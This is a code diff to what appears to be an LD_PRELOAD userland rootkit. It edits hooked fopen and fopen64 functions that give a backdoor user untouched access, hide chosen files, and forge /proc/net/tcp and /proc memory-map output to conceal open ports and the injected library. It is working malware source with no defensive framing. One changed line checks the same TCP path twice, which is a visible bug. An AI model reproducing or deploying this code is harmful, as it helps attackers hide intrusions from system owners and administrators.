@@ -1,13 +1,14 @@
 FILE *fopen(const char *pathname, const char *mode){
     hook(CFOPEN);
     if(is_bdusr()) return call(CFOPEN, pathname, mode);
+
     if(hidden_path(pathname)){
         errno = ENOENT;
         return NULL;
     }
 
 #ifdef HIDE_PORTS
-    if(!strncmp(TCP_PATH, pathname, strlen(TCP_PATH)) || !strncmp(TCP6_PATH, pathname, strlen(TCP6_PATH)))
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
         return forge_procnet(pathname);
 #endif
 
@@ -18,7 +19,7 @@ FILE *fopen(const char *pathname, const char *mode){
 
     char cwd[PATH_MAX];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strncmp(PROC_PATH, cwd, strlen(PROC_PATH))){
+        if(!strcmp(cwd, PROC_PATH)){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
@@ -47,8 +48,8 @@ FILE *fopen64(const char *pathname, const char *mode){
     }
 
 #ifdef HIDE_PORTS
-    if(!strncmp(TCP_PATH, pathname, strlen(TCP_PATH)) || !strncmp(TCP6_PATH, pathname, strlen(TCP6_PATH)))
-      return forge_procnet(pathname);
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp"))
+        return forge_procnet(pathname);
 #endif
 
 #ifdef FORGE_MAPS
@@ -58,7 +59,7 @@ FILE *fopen64(const char *pathname, const char *mode){
 
     char cwd[PATH_MAX];
     if(getcwd(cwd, sizeof(cwd)) != NULL){
-        if(!strncmp(PROC_PATH, cwd, strlen(PROC_PATH))){
+        if(!strcmp(cwd, PROC_PATH)){
             if(!fnmatch(MAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_maps(pathname);
             if(!fnmatch(SMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_smaps(pathname);
             if(!fnmatch(NMAPS_PROC_PATH, pathname, FNM_PATHNAME)) return forge_numamaps(pathname);
